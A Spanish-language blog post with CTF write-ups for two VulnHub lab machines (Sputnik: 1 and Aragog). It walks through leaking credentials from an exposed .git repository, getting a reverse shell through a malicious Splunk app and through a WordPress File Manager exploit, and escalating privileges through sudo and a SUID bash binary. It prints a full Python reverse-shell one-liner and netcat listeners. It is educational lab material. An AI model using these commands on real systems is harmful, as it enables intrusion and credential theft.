---
title: Writeups de la plataforma VulnHub 🧑‍💻
description: Writeups de cada máquina de la plataforma VulnHub. Se irá actualizando este artículo en función haga nuevas máquinas.
date: 2024-12-28
categories: [VulnHub, CTF]
tags: [VulnHub, CTF, Pentesting]
img_path: "/assets/img/vulnhub.png"
image: "/assets/img/vulnhub.png"
---

# Índice de máquinas resueltas 📝

# - [Sputnik: 1](#--sputnik-1)

# - [Aragog](#aragog)

---

## [Sputnik: 1](#índice-de-máquinas-resueltas-)

#### [🔗 **Link de Descarga**](https://www.vulnhub.com/entry/sputnik-1,301/)

![1](/assets/img/writeups/Sputnik-1/1.png)

### ¿Qué trabajamos con esta máquina?

- Git
- Exploit investigation
- Splunk
- Revshell
- Binary ed

### Fase de reconocimiento

Escaneo rápido, preciso y silencioso para descubrir los puertos TCP que hay abiertos:

```bash
sudo nmap -p- --open -sSCV -O  -vvv -n -Pn 192.168.1.136 -oN Ports.txt
```

```java
# Nmap 7.94SVN scan initiated Mon Jan  6 15:08:03 2025 as: /usr/lib/nmap/nmap -p- --open -sSCV -O -Pn -n -vvv -oN target.txt 192.168.1.136
Nmap scan report for 192.168.1.136
Host is up, received arp-response (0.00043s latency).
Scanned at 2025-01-06 15:08:03 EST for 34s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE  REASON         VERSION
8089/tcp  open  ssl/http syn-ack ttl 64 Splunkd httpd
|_http-server-header: Splunkd
|_http-title: splunkd
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/localityName=San Francisco/emailAddress=support@splunk.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-03-29T11:03:21
| Not valid after:  2022-03-28T11:03:21
| MD5:   4bb4:e4bf:17eb:45ff:00b6:fb9f:5470:b15c
| SHA-1: f8ee:5802:a921:3730:fbac:70dd:0baa:2d4a:94cf:64bc
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQD75q7jXuD3uTANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0xOTAzMjkxMTAzMjFaFw0yMjAzMjgxMTAz
| MjFaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4ZVZ
| 3LajUBeprsySGN4gAyGJHrNmfh5M3chrtGp5STguIEn63dMMKksrIALqcveK4L7n
| DYLioQ7+Z15NpYl9pW6fK5WvNJnspMGO8fg0378zuJKS57bFUPlaWGn8vrQ1Gye5
| FDqQ+teIxC9daQGunUhCTuBSI/fl8Q/gN9rQ8yUGErKytOJ5BAFcscf1lYKs3uw2
| 2Nc9XqJR0tisajXD+fENGFwZfKjBIXeON58WAKaB1VaJBapxSRBkC24eEiKNplsv
| iM64Vceail7VA0uX/T0SkqSoZMyL6tukz4C8hU3vhIg4eg0g+VeuE5q5V8xZPMr5
| K0pHwvr3gCh4Csq8qwIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQCItylA7nxoE03e
| KlAWgitiBMsOnqpKhnrdpl14MTjZPjwnBQ5EWsjk88y3omhq1Veyg92GkWiOPRnP
| 3zkyjZNkil2MMZPQPifYo/4cXEIJYX+2AUHezMDHqQFrJTM4gImecz4FfNfKjGJS
| ytzCeqQJZt3/Jj/LdNQdU7gbqBbYXZKsYIb+YXKUhADSWfjoYlPDYfo63/p+eoH+
| lpO5rr9ibOb/A2THNQZ/OFa3LodqI9vQ78KplPYdlHtrHKY76Ip7ZhqEI8BsOMKM
| 8CiVnkjId9RIYilfCzMEmZp+tGqzdhjlR6NnBkyIjxF4tQZOSBhQG/2sRdyaUjwU
| Qta5IOW5
|_-----END CERTIFICATE-----
| http-robots.txt: 1 disallowed entry 
|_/
55555/tcp open  http     syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Flappy Bird Game
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
| http-git: 
|   192.168.1.136:55555/.git/
|     Git repository found!
|_    Repository description: Unnamed repository; edit this file 'description' to name the...
61337/tcp open  http     syn-ack ttl 64 Splunkd httpd
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://192.168.1.136:61337/en-US/account/login?return_to=%2Fen-US%2F
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Splunkd
|_http-favicon: Unknown favicon MD5: E60C968E8FF3CC2F4FB869588E83AFC6
MAC Address: 08:00:27:D8:0B:51 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=1/6%OT=8089%CT=1%CU=39663%PV=Y%DS=1%DC=D%G=Y%M=0800
OS:27%TM=677C3845%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=106%TI=Z%CI=I%
OS:II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11N
OS:W7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=712
OS:0%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40
OS:%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=
OS:%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%
OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%
OS:DFI=N%T=40%CD=S)

Uptime guess: 22.689 days (since Sat Dec 14 22:36:56 2024)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan  6 15:08:37 2025 -- 1 IP address (1 host up) scanned in 34.28 seconds
```

Nos fijamos que hay un **/.git** por el puerto 55555.

![2](/assets/img/writeups/Sputnik-1/2.png)

Accedemos a él y miramos los **log**.

## Fase de Explotación

Llegamos hasta esta ruta en donde vemos el repositorio que ha sido clonado. Así que nos lo clonamos para ver mejor los logs.

![3](/assets/img/writeups/Sputnik-1/3.png)

```bash
git clone https://github.com/ameerpornillos/flappy.git
```

Entramos en el directorio y ejecutamos el siguiente comando para ver todos los commits realizados.

```bash
cd flappy

git log 
```

![4](/assets/img/writeups/Sputnik-1/4.png)

Miramos uno por uno hasta que encontramos un archivo **secret** en este hash (del commit).

```bash
git ls-tree 07fda135aae22fa7869b3de9e450ff7cacfbc717
```

![5](/assets/img/writeups/Sputnik-1/5.png)

Miramos el contenido con el siguiente :

```bash
git show f4385198ce1cab56e0b2a1c55e8863040045b085
```

![6](/assets/img/writeups/Sputnik-1/6.png)

Encontramos usuario y contraseña.

Miramos por el puerto 61337 y hay un login de un splunk.

![7](/assets/img/writeups/Sputnik-1/7.png)

Entramos con las credenciales anteriores.

Vemos las apps que hay. Así investigo y llego hasta repositorio donde podemos subir una "app" maliciosa, una revshell.

[Repositorio GitHub](https://github.com/TBGSecurity/splunk_shells?tab=readme-ov-file)

![8](/assets/img/writeups/Sputnik-1/8.png)

Nos descargamos el splunk_shells-1.2.tar.gz que hay.

![9](/assets/img/writeups/Sputnik-1/9.png)

Ahora lo subimos a Splunk. Para ello le damos a **Install app from file** y subimos el .tar.gz.

![10](/assets/img/writeups/Sputnik-1/10.png)

Vemos que se ha subido correctamente. Pero hay que cambiar algo antes. Los permisos.

![11](/assets/img/writeups/Sputnik-1/11.png)

Pondremos **All apps** para que el archivo sea visible en todas las aplicaciones, no solo en las del sistema. Si no, no podremos realizar la revshell.

![12](/assets/img/writeups/Sputnik-1/12.png)

Ahora nos iremos a la app de buscar y reportar. Escribiremos el siguiente comando para empezar la revshell.

```bash
| revshell std [IP] [PORT]
```

![13](/assets/img/writeups/Sputnik-1/13.png)

Nos ponemos en escucha por el puerto escogido y le daremos enter para comenzar la reverse shell.

```bash
nc -lvp 1234
```

![14](/assets/img/writeups/Sputnik-1/14.png)

Splunk utiliza Python para script, etc. Entonces nos enviaremos una shell nueva para poder hacer un correcto tratamiento de la TTY. 

Ejecutaremos el siguiente comando en la shell obtenida: (Cambiamos la IP y el PUERTO)

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.137",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![15](/assets/img/writeups/Sputnik-1/15.png)

Y nos pondremos en escucha para recibir esta nueva shell por el puerto escogido.

```bash
nc -nlvp 4444
```

![1](/assets/img/writeups/Sputnik-1/16.png)

Una vez conseguida la nueva shell, haremos un tratamiento de la TTY con este comando:

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

![17](/assets/img/writeups/Sputnik-1/17.png)

## Escalada de Privilegios

Ejecutamos el comando **sudo -l** para ver que binarios podemos ejecutar como otro usuario sin pedirnos clave.

```bash
sudo -l
```

![18](/assets/img/writeups/Sputnik-1/18.png)

Buscamos en GTFOBins y simplemente con ejecutar el binario y luego hacer una **!/bin/bash** conseguimos la shell como root en este caso.

![19](/assets/img/writeups/Sputnik-1/19.png)

Lo hacemos y conseguimos ser root:

![20](/assets/img/writeups/Sputnik-1/20.png)

Vemos la flag :)

![21](/assets/img/writeups/Sputnik-1/21.png)

---

## [Aragog](#índice-de-máquinas-resueltas-)

![1](/assets/img/writeups/aragog/1.png)

#### [🔗 **Link de Descarga**](https://www.vulnhub.com/entry/harrypotter-aragog-102,688/)

### ¿Qué trabajamos con esta máquina?

- Fuzzing
- Wordpress
- Vulnerability Plugin File Manager (CVE-2020-25213)
- MySQL
- Hash Cracking
- Binario bash con permiso SUID

### Fase de reconocimiento

Hacemos un escaneo bastante rápido para descubrir los puertos TCP que hay abiertos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.135 -oN Ports.txt
```

| **Opción**        | **Propósito**                                           |
| ----------------- | ------------------------------------------------------- |
| `-p-`             | Escaneo a los 65535 puertos                             |
| `--open`          | Muestra solo los abiertos                               |
| `--min-rate 5000` | Paquetes no más lentos que 5000 paquetes por segundo    |
| `-vvv`            | Mostrar el escaneo en función de que se vaya a haciendo |
| `-n`              | Desactiva la resolución DNS. Mayor rapidez              |
| `-Pn`             | Desactiva la resolución de host                         |
| `-oN`             | Guarda el escaneo en formato normal.                    |

![2](/assets/img/writeups/aragog/2.png)

A continuación miramos que hay en el puerto 80 y nos encontramos:

![3](/assets/img/writeups/aragog/3.png)

Intento hacer fuzzing y encontramos una ruta válida.

![4](/assets/img/writeups/aragog/4.png)

Lo miramos y vemos que no está cargando bien, esto es debido a que hay un dominio que no se está resolviendo.

Además descubrimos que es un Wordpress.

![5](/assets/img/writeups/aragog/5.png)

Miramos el código fuente y descubrimos el dominio, además de un subdominio. Lo añadimos al **/etc/hosts**

![6](/assets/img/writeups/aragog/6.png)

Ya si resuelve bien.

![7](/assets/img/writeups/aragog/7.png)

### Fase de Explotación

Utilizamos WPscan y enumeramos estos usuarios y tema. A simple vista no nos detecta ningún plugin.

```bash
wpscan --url http://wordpress.aragog.hogwarts/blog/ -e u,t,p
```

![8](/assets/img/writeups/aragog/8.png)

Utilizo **nuclei** y nos detecta lo siguiente:

[Incibe - CVE-2020-25213](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2020-25213)

```bash
nuclei -u http://wordpress.aragog.hogwarts/blog/
```

![9](/assets/img/writeups/aragog/9.png)

Busco en Internet y llego a esta página de wpscan en la que nos da un link para descargar un exploit en python. Este exploit lo que hace es subir un archivo llamado payload.php que es ejecutado en el servidor.

![10](/assets/img/writeups/aragog/10.png)

Nos lo pasamos a nuestro directorio de trabajo.

```bash
mv /home/kali/Downloads/eploit.py .
```

![11](/assets/img/writeups/aragog/11.png)

Lo abrimos y vemos como se usa. Claramente vemos que el archivo tiene que llamarse payload.php. Así que copiamos la revshell de pentestmonkey en un archivo llamado payload.php.

![12](/assets/img/writeups/aragog/12.png)

Lo creamos con ese nombre y nos copiamos la reverse shell.

[Revshell](https://www.revshells.com/)

![14](/assets/img/writeups/aragog/14.png)

Y la pegamos en el archivo llamado **payload.php**

![13](/assets/img/writeups/aragog/13.png)

Ahora ejecutamos tal y como viene en el exploit.

![15](/assets/img/writeups/aragog/15.png)

Miramos la ruta que nos da, pero antes nos ponemos en escucha con netcat por el puerto elegido en la revshell.

```bash
nc -nlvp 443
```

Conseguimos la revshell exitosamente. Ahora hacemos un tratamiento de la TTY.

[Tratamiento TTY](https://github.com/Alv-fh/tty_treatment)

![16](/assets/img/writeups/aragog/16.png)

### Escalada de privilegios

Buscamos archivos de configuración y encontramos esto:

```bash
find / -name config*.php 2>/dev/null
```

![17](/assets/img/writeups/aragog/17.png)

Lo abrimos y encontramos las credenciales para acceder a la base de datos.

![18](/assets/img/writeups/aragog/18.png)

Conseguimos entrar correctamente.

![19](/assets/img/writeups/aragog/19.png)

Entramos en la base de datos **wordpress** y listamos usuarios.

```mysql
show databases;
use wordpress;
show tables;
select * FROM wp_users
```

![20](/assets/img/writeups/aragog/20.png)

Entonces es hora de utilizar John The Ripper para crackear el hash.

Nos pegamos el hash en un fichero.

![21](/assets/img/writeups/aragog/21.png)

Utilizamos john.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![22](/assets/img/writeups/aragog/22.png)

Conseguimos acceder al usuario hagrid y listamos el contenido de su home. Nos da un texto en base 64. Pero decido buscar binarios con permiso SUID y encuentro el binario **bash**. Lo que me sorprende bastante.

![23](/assets/img/writeups/aragog/23.png)

Ya que si ejecutamos un simple `bash -p` conseguiremos máximo privilegio.

![24](/assets/img/writeups/aragog/24.png)

Buscamos en el directorio de root y encontramos la "flag"

![25](/assets/img/writeups/aragog/25.png)

Y el segundo horcrux jeje.

![26](/assets/img/writeups/aragog/26.png)